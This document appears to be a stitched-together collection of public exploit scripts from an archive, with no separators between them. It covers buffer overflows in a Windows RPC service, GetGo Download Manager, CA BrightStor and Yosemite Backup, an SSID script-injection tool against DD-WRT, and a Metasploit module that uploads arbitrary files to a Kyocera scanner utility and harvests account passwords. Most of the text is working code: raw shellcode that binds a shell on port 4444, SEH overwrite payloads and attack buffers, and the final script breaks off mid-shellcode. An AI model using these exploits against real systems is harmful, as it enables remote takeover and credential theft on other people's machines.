       request += struct.pack("<L", 0x77EE044C)
       request += "\x90\x90\x90\x90" * 2
       #Portbinding shellcode; Opens shell on TCP port 4444
       request += "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0"
       request += "\x6f\xe3\x2a\x83\xeb\xfc\xe2\xf4\x1c\x05\x08\x67\x08\x96\x1c\xd5"
       request += "\x1f\x0f\x68\x46\xc4\x4b\x68\x6f\xdc\xe4\x9f\x2f\x98\x6e\x0c\xa1"
       request += "\xaf\x77\x68\x75\xc0\x6e\x08\x63\x6b\x5b\x68\x2b\x0e\x5e\x23\xb3"
       request += "\x4c\xeb\x23\x5e\xe7\xae\x29\x27\xe1\xad\x08\xde\xdb\x3b\xc7\x02"
       request += "\x95\x8a\x68\x75\xc4\x6e\x08\x4c\x6b\x63\xa8\xa1\xbf\x73\xe2\xc1"
       request += "\xe3\x43\x68\xa3\x8c\x4b\xff\x4b\x23\x5e\x38\x4e\x6b\x2c\xd3\xa1"
       request += "\xa0\x63\x68\x5a\xfc\xc2\x68\x6a\xe8\x31\x8b\xa4\xae\x61\x0f\x7a"
       request += "\x1f\xb9\x85\x79\x86\x07\xd0\x18\x88\x18\x90\x18\xbf\x3b\x1c\xfa"
       request += "\x88\xa4\x0e\xd6\xdb\x3f\x1c\xfc\xbf\xe6\x06\x4c\x61\x82\xeb\x28"
       request += "\xb5\x05\xe1\xd5\x30\x07\x3a\x23\x15\xc2\xb4\xd5\x36\x3c\xb0\x79"
       request += "\xb3\x3c\xa0\x79\xa3\x3c\x1c\xfa\x86\x07\xf2\x76\x86\x3c\x6a\xcb"
       request += "\x75\x07\x47\x30\x90\xa8\xb4\xd5\x36\x05\xf3\x7b\xb5\x90\x33\x42"
       request += "\x44\xc2\xcd\xc3\xb7\x90\x35\x79\xb5\x90\x33\x42\x05\x26\x65\x63"
       request += "\xb7\x90\x35\x7a\xb4\x3b\xb6\xd5\x30\xfc\x8b\xcd\x99\xa9\x9a\x7d"
       request += "\x1f\xb9\xb6\xd5\x30\x09\x89\x4e\x86\x07\x80\x47\x69\x8a\x89\x7a"
       request += "\xb9\x46\x2f\xa3\x07\x05\xa7\xa3\x02\x5e\x23\xd9\x4a\x91\xa1\x07"
       request += "\x1e\x2d\xcf\xb9\x6d\x15\xdb\x81\x4b\xc4\x8b\x58\x1e\xdc\xf5\xd5"
       request += "\x95\x2b\x1c\xfc\xbb\x38\xb1\x7b\xb1\x3e\x89\x2b\xb1\x3e\xb6\x7b"
       request += "\x1f\xbf\x8b\x87\x39\x6a\x2d\x79\x1f\xb9\x89\xd5\x1f\x58\x1c\xfa"
       request += "\x6b\x38\x1f\xa9\x24\x0b\x1c\xfc\xb2\x90\x33\x42\x10\xe5\xe7\x75"
       request += "\xb3\x90\x35\xd5\x30\x6f\xe3\x2a"

       dce.call(43, request)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target ip>\n' % sys.argv[0]
               sys.exit(-1)

       DCEconnectAndExploit(target)

# milw0rm.com [2007-01-27]
#!/usr/bin/python
# Exploit Title: GetGo Download Manager HTTP Response Header Buffer Overflow Remote Code Execution
# Version:       v4.9.0.1982
# CVE:           CVE-2014-2206
# Date:          2014-03-09
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.getgosoft.com
# Tested on:     WinXP SP3-GER 
#
# Howto / Notes:
# SEH overwrite was taken from outside of loaded modules, because all modules are SafeSEH-enabled
#

from socket import *
from time import sleep
from struct import pack
 
host = "192.168.0.1"
port = 80
 
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port
 
cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
 
junk0 = "\x90" * 4107
nseh = "\x90\x90\xEB\x06"
seh=pack('<L',0x00280b0b)  # call dword ptr ss:[ebp+30] [SafeSEH Bypass]
nops = "\x90" * 50

# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'

shellcode = ("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")

payload = junk0 + nseh + seh + nops + shellcode

buffer = "HTTP/1.1 200 "+payload+"\r\n"
 
print cl.recv(1000)
cl.send(buffer)
print "[+] Sending buffer: OK\n"

sleep(3)
cl.close()
s.close()
source: http://www.securityfocus.com/bid/30573/info

DD-WRT is prone to a script-injection vulnerability because it fails to adequately sanitize user-supplied data to the 'Site Survey' section of the administrative web interface.

Attackers can exploit this issue to execute arbitrary script code in the DD-WRT web interface.

Versions prior to DD-WRT 24-sp1 are vulnerable. 

#!/usr/bin/env python
# 
# This tool is distributed under a BSD licence. A copy of this 
# should have been included with this file.
#
# Copyright (c) 2008, Rafael Dominguez Vega.
#
# This tool is designed for the purpose of performing security 
# testing only and is not intended to be used for unlawful 
# activities.
#
# This tool can be used to check for SSID script injection 
vulnerabilities 
# in different sofware products.
# 
# Help can be viewed by running this file with --help. 
# 
#
# Author: Rafael Dominguez Vega
# Version: 0.0.2
#
# Further information: rafael ({dot}) dominguez-vega <(at)> 
mwrinfosecurity {(dot)} com
#

import optparse
import sys
import os
import time
from optparse import OptionParser

class OptionParser (optparse.OptionParser):

    def check_required (self, opt):
        option = self.get_option(opt)

        if getattr(self.values, option.dest) is None:
            self.error("%s option not supplied" % option)

parser = OptionParser()
parser.add_option("-i", "--interface1", action="store", 
dest="ap1",help="Network interface for first Access Point (required)")
parser.add_option("-j", "--interface2", action="store", dest="ap2", 
help="Network interface for second Access Point (required)")
parser.add_option("-s", "--ssid1", action="store", dest="ssid1",  
help="SSID for first Access Point.  Between double quotes (\"\") if 
special characters are used (required)")
parser.add_option("-t", "--ssid2", action="store", dest="ssid2", 
help="SSID for second Access Point.  Between double quotes (\"\") if 
special characters are used (required)")

(options, args) = parser.parse_args()

parser.check_required("-i")
if options.ap1:
    ap1 = options.ap1
else:
    sys.exit(0)
    
parser.check_required("-j")
if options.ap2:
    ap2 = options.ap2
else:
    sys.exit(0)
    
parser.check_required("-s")
if options.ssid1:
    ssid1 = options.ssid1
else:
    sys.exit(0)
    
parser.check_required("-t")
if options.ssid2:
    ssid2 = options.ssid2
else:
    sys.exit(0)



ssid1 = ssid1.replace("<", "\<")
ssid1 = ssid1.replace(">","\>")
ssid1 = ssid1.replace("(","\(")
ssid1 = ssid1.replace(")","\)")
ssid1 = ssid1.replace("$","\$")
ssid1 = ssid1.replace("&","\&")
ssid1 = ssid1.replace(";","\;")
ssid1 = ssid1.replace("|","\|")
ssid1 = ssid1.replace("*","\*")
ssid1 = ssid1.replace(" ","\ ")

ssid2 = ssid2.replace("<", "\<")
ssid2 = ssid2.replace(">","\>")
ssid2 = ssid2.replace("(","\(")
ssid2 = ssid2.replace(")","\)")
ssid2 = ssid2.replace("$","\$")
ssid2 = ssid2.replace("&","\&")
ssid2 = ssid2.replace(";","\;")
ssid2 = ssid2.replace("|","\|")
ssid2 = ssid2.replace("*","\*")
ssid2 = ssid2.replace(" ","\ ")


os.system("wlanconfig "+ap1+" destroy")
os.system("wlanconfig "+ap2+" destroy")
print("\n Initialising fake APs...\n")

os.system("wlanconfig "+ap1+" create wlandev wifi0 wlanmode ap bssid")
time.sleep(3)
os.system("iwconfig "+ap1+" essid "+ssid1)
time.sleep(2)
os.system("wlanconfig "+ap2+" create wlandev wifi0 wlanmode ap bssid")
time.sleep(3)
os.system("iwconfig "+ap2+" essid "+ssid2)

print("Payload: "+ssid1+ssid2)



source: http://www.securityfocus.com/bid/30855/info

Kyocera Mita Scanner File Utility is prone to a directory-traversal vulnerability because it fails to adequately sanitize user-supplied input.

Attackers can exploit this issue to create and overwrite arbitrary files on the affected computer.

Kyocera Mita Scanner File Utility 3.3.0.1 is vulnerable; other versions may also be affected. 

module Msf

class Auxiliary::Spoof::Kyocera::FileUtility < Msf::Auxiliary
	
	#
	# This exploit affects TCP servers, so we use the TCP client mixin.
	#
	include Exploit::Remote::Tcp
	
	def initialize(info = {})
	super(update_info(info,
		
		'Name' => 'Kyocera Mita File Utility File Injection',
		'Description' => %q{
			This exploit attacks the Kyocera Mita File Utility 3.3.0.1 that is part of a scan to desktop
			solution. There are several bugs in this service. First, there is no authentication. This means anyone
			can upload a file to the target PC. Second, the file can contain anything, including binary data. Finally,
			the file name can be altered to include directory information, thus redirecting the file from
			the default upload location to a specified location. Combined, the service will allow a remote attacker
			to upload any file to any location on the system. If you do
			not know the correct ID number of the client side account, you can use the included getidno command to
			scan a system to detect any and all ID numbers. This will also provide you with any associated 
			passwords required by printer to upload documents.
		},

		'Author'         => 'Seth Fogie <seth@whitewolfsecurity.com>'

		)
	)
	register_options(
          [
              	OptString.new('RPORT', [ true,  "Target port - default is 37100", '37100' ]),
              	OptString.new('RHOST', [ true,  "Target host", '1']),
		 	OptString.new('CMD', [ true,  "Command", 'calc.exe']),
			OptInt.new('IDNO', [ true,  "ID number (1-100)", '1']),
			OptString.new('IDENT', [ true,  "Identification name", 'ANON']),
			OptString.new('FILENAME', [ true,  "File name (with folder)", 'Kyocera.bat']),
			OptString.new('FOLDER', [ false,  "Folder (relative to scan folder)", '']),

          ], self.class
          )
end

	
	def auxiliary_commands
		return { 
			"getidno" => "Determine a correct idno",
		 }
	end

	#this command detects any and all valid accounts on target machine and returns associated passwords.
	def cmd_getidno()
				
		1.upto(100) do |i|
   		
			connect
	
			print(".")
			
			# Build the buffer for transmission
			buf= "\x00\x06\x34\x00\x00\x02\x00\x00" #control message to PC
	
			# Send it off and get response
			sock.put(buf)
			sock.get
	
			#add ID number
			idno  = i
	
			buf = "\x02\x1c\x34\x02" +			#details about file name for file utility function
			[idno].pack('n') +				#ID number
			"\x00\x08" +
			"\x00\x0d" +
			"\x41\x41\x41\x41\x00\x4e\x53\x4e\x5f\x53\x4b\x41\x4e\x3a" +
			"\x41\x41\x41\x41\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00"
	
			sock.put(buf)
			nulls="\x00\x00"
			passTest="\xFF\xFF"
			data=sock.get
			dataStr=data.to_s

			if dataStr[dataStr.length-6,2] == nulls
				print("\n")
				print_status("Valid account number found: " + i.to_s)	
			end
			if dataStr[dataStr.length-2,2] != passTest
				print_status("BONUS! Password! (last four or eight characters of string)" )
				j=0
				while j<12
       				printf("%X",data[j])
     					j+=1
			       end
				print("\n")
			end

			
	
			sock.close
		end
		print("\n")
				
	end
	

#
# The exploit sends the specified command into a kyocera.bat file in the specified folder
#
def run

	begin
	connect
	
	print_status("Sending command...")
	
	# Build the buffer for transmission
	buf= "\x00\x06\x34\x00\x00\x02\x00\x00" #control message to PC
	
	# Send it off and get response
	sock.put(buf)
	sock.get
	
	#add ID number
	idno  = datastore['IDNO']
	ident = datastore['IDENT']
	filename = datastore['FILENAME']
	folder = datastore['FOLDER']
	locationLength = filename.length + folder.length

	
	buf = "\x02\x1c\x34\x02" +			#details about file name for file utility function
	[idno].pack('n') +				#ID number
	"\x00\x08" +
	"\x00\x0d" +
	"\x41\x41\x41\x41" +
	"\x00\x4e\x53\x4e\x5f\x53\x4b\x41\x4e\x3a" +
	ident +
	"\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00"

	
	
	sock.put(buf)
	nulls="\x00\x00"
	passTest="\xFF\xFF"
	data=sock.get
	dataStr=data.to_s
	
	#print_status(nulls)
	#print_status(dataStr[dataStr.length-6,2])

	if dataStr[dataStr.length-6,2] != nulls
		print_status("Invalid account number - use getidno command to find valid idno")	
	end
	if dataStr[dataStr.length-2,2] != passTest
		print_status("BONUS! Password! (last four or 8 characters of string)" )
		j=0
		while j<12
       		printf("%X",data[j])
     			j+=1
		end
		print("\n")
	end

	buf = "\x00\x54" +				#details about file name 
	"\x30" +					#location size (must be x30)
	"\x01" +					#can be altered to include folder and file
	"\x00\x05\x00\x00" +
	"\xff\xff\xff\xff\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x00\x00\x00" +
	"\x00\x00\x00\x00\x00\x24" +
	folder + filename
	
	padding = 48-locationLength
	j=0
	while j<padding
       	buf += "\x00"
     		j+=1
	end
	

	#"\x4b\x79\x6f\x63\x65\x72\x61\x2e\x62\x61\x74" +
	#"\x00\x00\x00"


	#add command length
	thecommand  = datastore['CMD']
	cmdLen = thecommand.length
	buf += [cmdLen].pack('N')
	
	#add command
	buf << thecommand
	
	j=0

	#put file
	sock.put(buf)				

	buf = "\x00\x04\x30\x02\x00\x00"


	
	sock.put(buf)				
	
	buf="\x00\x04\x30\x05\x53\xdc"	

	sock.put(buf)
	sock.get
	
	buf="\x00\x04\x30\x03\x00\x00"

	sock.put(buf)
	sock.get

	end
end
end
end#!/usr/bin/python
# Remote exploit for the CA BrightStor Arcserve stack overflow as
# described in http://www.securityfocus.com/archive/1/458648/30/0/threaded
#
#
# Winny Thomas ;-)
# Author shall bear no responsibility for any screw ups caused by using this code
#

import os
import sys
import socket
import struct

#Portbind shellcode; Binds shell on TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
shellcode += "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90"

def ExploitCA(target):
       sockAddr = (target, 1900)
       tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       tsock.connect(sockAddr)

       payload = str('0000033000')
       payload += "\x90" * 2322

       #At the time of overflow EBX points to this location
       payload += "\x90\x90\xeb\x08" #Jump over return address into shellcode
       payload += struct.pack("<L", 0x7C577B03) #call ebx from kernel32.dll
       payload += shellcode
       payload += "X" * (30670 - len(shellcode))

       tsock.send(payload)

def ConnectShell(target):
       ConnStr = "/usr/bin/telnet " + target + " 4444"
       os.system(ConnStr)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target>' % sys.argv[0]
               sys.exit(-1)

       ExploitCA(target)
       ConnectShell(target)

# milw0rm.com [2007-02-01]
source: http://www.securityfocus.com/bid/32246/info

Yosemite Backup is prone to a buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied data before copying it to an insufficiently sized buffer.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application or cause a denial-of-service condition.

NOTE: Reports indicate that successful exploits allow remote code execution on Linux systems and denial of service on Windows systems.

Yosemite Backup 8.70 is vulnerable; other versions may also be affected. 

import os
import sys
import socket
# http://www.insight-tech.org
# http://www.insight-tech.org/xploits/yosemiteStackOverflowExploit.zip
#Yosemite backup 8.7 PoC by AbdulAziz Hariri.
#BIND TO PORT 4444 - Metasploit
shellcode=("\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x90"
"\x9f\xfa\x9d\x83\xeb\xfc\xe2\xf4\xa1\x44\xa9\xde\xc3\xf5\xf8\xf7"
"\xf6\xc7\x63\x14\x71\x52\x7a\x0b\xd3\xcd\x9c\xf5\x81\xc3\x9c\xce"
"\x19\x7e\x90\xfb\xc8\xcf\xab\xcb\x19\x7e\x37\x1d\x20\xf9\x2b\x7e"
"\x5d\x1f\xa8\xcf\xc6\xdc\x73\x7c\x20\xf9\x37\x1d\x03\xf5\xf8\xc4"
"\x20\xa0\x37\x1d\xd9\xe6\x03\x2d\x9b\xcd\x92\xb2\xbf\xec\x92\xf5"
